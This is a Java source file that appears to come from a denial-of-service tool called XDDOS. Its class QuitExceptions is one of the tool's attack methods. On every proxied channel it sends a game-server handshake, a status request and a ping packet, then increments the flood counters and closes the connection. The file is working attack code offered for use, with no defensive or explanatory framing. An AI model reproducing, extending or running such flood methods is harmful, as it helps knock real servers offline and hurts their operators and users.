package XD.XDDOS.methods;

import XD.XDDOS.XDDOS;
import XD.XDDOS.NettyBootstrap;
import XD.XDDOS.ProxyLoader;
import XD.XDDOS.utils.Handshake;
import XD.XDDOS.utils.PingPacket;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;

public class QuitExceptions
implements Method {

        private byte[] handshakebytes = (new Handshake(XDDOS.protcolID, XDDOS.srvRecord, XDDOS.port, 2)).getWrappedPacket();

    @Override
    public void accept(Channel channel, ProxyLoader.Proxy proxy) {
        channel.writeAndFlush(Unpooled.buffer().writeBytes(this.handshakebytes));
        channel.writeAndFlush(Unpooled.buffer().writeBytes(new byte[] { 1 }));
        channel.writeAndFlush(Unpooled.buffer().writeBytes((new PingPacket(System.currentTimeMillis())).getWrappedPacket()));
        NettyBootstrap.integer++;
        NettyBootstrap.totalConnections++;
        channel.close();
      }
}
